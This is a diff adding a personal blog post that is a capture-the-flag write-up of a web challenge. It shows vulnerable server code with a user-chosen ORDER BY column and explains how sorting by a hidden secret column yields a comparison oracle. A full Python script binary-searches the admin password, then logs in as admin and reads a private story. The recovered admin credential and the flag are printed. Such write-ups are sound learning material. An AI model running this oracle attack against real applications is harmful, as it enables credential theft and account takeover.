@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Birthday writeup!!! messageboard — Cosmic Crusader</title>
+  <meta name="description" content="A write-up for gaslightctf26 messageboard">
+  <meta name="author" content="Cosmic Crusader">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>✿</text></svg>">
+  <script>
+    (function () {
+      var savedTheme = localStorage.getItem('theme');
+      document.documentElement.classList.add(savedTheme === 'light' ? 'light' : 'dark');
+    }());
+  </script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Architects+Daughter&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../style.css?v=anchor-fix-3">
+</head>
+<body>
+  <a href="#main" class="skip-link">Skip to content</a>
+  <nav class="nav-bar" aria-label="Main navigation">
+    <div class="nav-container">
+      <a href="../" class="nav-link">home</a>
+      <a href="../posts.html" class="nav-link active">posts</a>
+    </div>
+  </nav>
+  <button id="theme-toggle" class="theme-toggle" aria-label="Toggle dark mode" aria-pressed="true">
+    <i data-lucide="sun" class="icon-sun" aria-hidden="true"></i>
+    <i data-lucide="moon" class="icon-moon" aria-hidden="true"></i>
+  </button>
+  <main id="main" class="post-page-main">
+    <div class="post-shell">
+      <nav class="post-toc" aria-label="On this page"><span class="toc-label">on this page</span><ol><li class="toc-level-3"><a href="#details-1">Details</a></li><li class="toc-level-3"><a href="#description-2">Description</a></li><li class="toc-level-2"><a href="#writeup-3">Writeup</a></li><li class="toc-level-3"><a href="#code-breakdown-4">Code breakdown</a></li><li class="toc-level-3"><a href="#from-the-challenge-author-writeup-turning-the-sort-into-an-oracle-5">From the challenge author writeup Turning the sort into an oracle</a></li><li class="toc-level-3"><a href="#binary-searching-for-the-admin-secret-6">Binary searching for the admin secret</a></li><li class="toc-level-3"><a href="#getting-the-flag-7">Getting the flag</a></li><li class="toc-level-3"><a href="#flag-8">Flag</a></li><li class="toc-level-3"><a href="#exact-script-used-9">Exact script used</a></li><li class="toc-level-3"><a href="#conclusion-10">Conclusion</a></li></ol></nav>
+      <article class="post-article">
+        <header class="post-header">
+          <a class="back-link" href="../posts.html">← all posts</a>
+          <h1>Birthday writeup!!! messageboard</h1>
+          <p class="post-meta">2026/08/18</p>
+        </header>
+        <div class="markdown-body"><p>:o its my birthday and im 16</p>
+<blockquote>spoilers obviously duh</blockquote>
+<h3 id="details-1"><a class="heading-link" href="#details-1">Details</a></h3>
+<ul><li>Author: sportshead/sportzpikachu</li><li>Category: <del>OSINT</del> Web Exploitation</li><li>Score Acquired: 347 (124 solves)</li><li>Difficulty ★★★★☆☆☆☆☆☆  </li></ul>
+<h3 id="description-2"><a class="heading-link" href="#description-2">Description</a></h3>
+<p><img src="https://hackmd.io/_uploads/rk4qMhxDMx.png" alt="image"></p>
+<h2 id="writeup-3"><a class="heading-link" href="#writeup-3">Writeup</a></h2>
+<p>I first thought this was going to be some JWT or cookie forgery thing from the title, but it was not. [insert fah noise]</p>
+<p>The actual bug was an SQL ordering oracle. More specifically, the app let us choose the column used in an <code>ORDER BY</code>, and one of the columns we could choose was the hidden <code>secret</code> column.</p>
+<p>How did I find this? <del>osinting the challenge author</del> if we look at https://sportshead.dev/2023/11/15/hkcert23/#secret-notebook---web <img src="https://hackmd.io/_uploads/B1KH0sgDzg.png" alt="image"> <img src="https://hackmd.io/_uploads/r1LdCjePMx.png" alt="image"> There was a nice little writeup already!!, how peculiar! and it somehow kinda matches with messageboard?</p>
+<h3 id="code-breakdown-4"><a class="heading-link" href="#code-breakdown-4">Code breakdown</a></h3>
+<p>The relevant part of the source had this:</p>
+<pre><button class="code-copy" type="button" data-copy-code>copy</button><code class="language-js">const column = url.searchParams.get(&quot;column&quot;) || &quot;name&quot;;
+const order = url.searchParams.get(&quot;order&quot;) || &quot;ASC&quot;;
+
+if (!filter(column) || !filter(order)) {
+  return Response.json({ error: &quot;nuh uh&quot; }, { status: 400 });
+}
+
+const publicStories = await query(`
+  SELECT name AS author,
+         &#39;public&#39; AS visibility,
+         public AS story,
+         public_expiry AS expiry
+  FROM users
+  WHERE public IS NOT NULL
+    AND public_expiry &gt; now()
+  ORDER BY ${column} ${order}`);</code></pre>
+<p>The filter only allowed alphanumeric characters. So classic SQL injection like this was not possible:</p>
+<pre><button class="code-copy" type="button" data-copy-code>copy</button><code class="language-text">&#39; OR 1=1 --</code></pre>
+<p>But it still allowed valid SQL identifiers. <code>secret</code> was alphanumeric, and it was also a real column in the database.</p>
+<p>The frontend did not display <code>secret</code>, but the database could still use it for sorting. This was the whole bug.</p>
+<h3 id="from-the-challenge-author-writeup-turning-the-sort-into-an-oracle-5"><a class="heading-link" href="#from-the-challenge-author-writeup-turning-the-sort-into-an-oracle-5"><del>From the challenge author writeup</del> Turning the sort into an oracle</a></h3>
+<p>I could create users with passwords I chose. So I made a user with a 16-character hex password, then posted a public story from that account.</p>
+<p>After that I requested:</p>
+<pre><button class="code-copy" type="button" data-copy-code>copy</button><code class="language-text">/api/stories?column=secret&amp;order=ASC</code></pre>
+<p>The response showed the public stories in secret order. Since I knew my own secret, I could compare the position of my user and the admin user.</p>
+<p>If the admin appeared before my user, then:</p>
+<pre><button class="code-copy" type="button" data-copy-code>copy</button><code class="language-text">admin_secret &lt; my_guess</code></pre>
+<p>If the admin appeared after my user, then:</p>
+<pre><button class="code-copy" type="button" data-copy-code>copy</button><code class="language-text">admin_secret &gt; my_guess</code></pre>
+<p>So even though I could not read the secret directly, I had a comparison oracle for it.</p>
+<h3 id="binary-searching-for-the-admin-secret-6"><a class="heading-link" href="#binary-searching-for-the-admin-secret-6">Binary searching for the admin secret</a></h3>
+<p>The admin secret came from 8 random bytes, which becomes 16 hex characters. That is 64 bits of secret, so a binary search needs at most 64 comparisons.</p>
+<p>Each comparison was basically:</p>
+<ol><li>create a user with the current guess as its password</li><li>post a public story</li><li>request the stories ordered by <code>secret</code></li><li>check whether <code>admin</code> was before or after my user</li><li>update the binary-search range</li></ol>
+<p>This is pretty annoying by hand, but not that hard to automate, so time to write a script!</p>
+<h3 id="getting-the-flag-7"><a class="heading-link" href="#getting-the-flag-7">Getting the flag</a></h3>
+<p>After recovering the admin secret, I logged in as:</p>
+<pre><button class="code-copy" type="button" data-copy-code>copy</button><code class="language-text">admin:cbd45670ae3ea76e</code></pre>
+<p>Then I read the admin&#39;s close-friends story, which contained the flag!!</p>
+<h3 id="flag-8"><a class="heading-link" href="#flag-8">Flag</a></h3>
+<pre><button class="code-copy" type="button" data-copy-code>copy</button><code class="language-text">gaslightCTF{ar3_y0u_my_cl0s3_fr13nd_n0w?_75aa7d355f15}</code></pre>
+<h3 id="exact-script-used-9"><a class="heading-link" href="#exact-script-used-9">Exact script used</a></h3>
+<pre><button class="code-copy" type="button" data-copy-code>copy</button><code class="language-py">import requests,secrets
+url=&quot;https://01d52094-a1ed-4f2a-af0f-40a4228c2bca.play.gaslightctf.cooking:1337&quot;
+n = 16**16
+def check(p):
+    s=requests.Session()
+    u = &quot;u&quot;+secrets.token_hex(6)
+
+    s.post(url+&quot;/api/signup&quot;,json={&quot;name&quot;:u,&quot;password&quot;:p})
+    s.post(url+&quot;/api/stories&quot;,json={
+        &quot;story&quot;:&quot;x&quot;, &quot;visibility&quot;:&quot;public&quot;, &quot;minutes&quot;:1440
+    })
+
+    r=s.get(url+&quot;/api/stories?column=secret&amp;order=ASC&quot;).json()
+    a=[x[&quot;author&quot;] for x in r if x[&quot;visibility&quot;]==&quot;public&quot;]
+
+    return a.index(u) &lt; a.index(&quot;admin&quot;)
+
+lo,hi=0,n-1
+
+while lo &lt; hi:
+    m=(lo+hi)//2
+    p=f&quot;{m:016x}&quot;
+
+    if check(p):
+        lo=m+1
+    else:
+        hi=m
+
+for x in [lo-1,lo,lo+1]:
+    p=f&quot;{x:016x}&quot;
+    s=requests.Session()
+    r=s.post(url+&quot;/api/login&quot;,json={&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:p})
+
+    if r.ok:
+        print(&quot;password:&quot;,p)
+        stories=s.get(url+&quot;/api/stories&quot;).json()
+        for story in stories:
+            if story[&quot;author&quot;]==&quot;admin&quot; and story[&quot;visibility&quot;]==&quot;close_friends&quot;:
+                print(story[&quot;story&quot;])
+</code></pre>
+<h3 id="conclusion-10"><a class="heading-link" href="#conclusion-10">Conclusion</a></h3>
+<p>This was pretty funny as the challenge author had literally a writeup on a kinda similar challenge. Thanks for reading this writeup! I hope that <del>this can win me some $$</del> !!!</p></div>
+      </article>
+    </div>
+  </main>
+  <footer><p><span class="footer-year">2026</span><span class="footer-sep" aria-hidden="true">·</span><span class="footer-line">© 2026 Cosmic Crusader. MTD26{cl0ut_f0r_th3_w1n!1}</span></p></footer>
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <script>if (window.lucide && typeof lucide.createIcons === 'function') lucide.createIcons();</script>
+  <script src="../theme.js?v=anchor-fix-3"></script>
+  <script src="../post.js"></script>
+</body>
+</html>
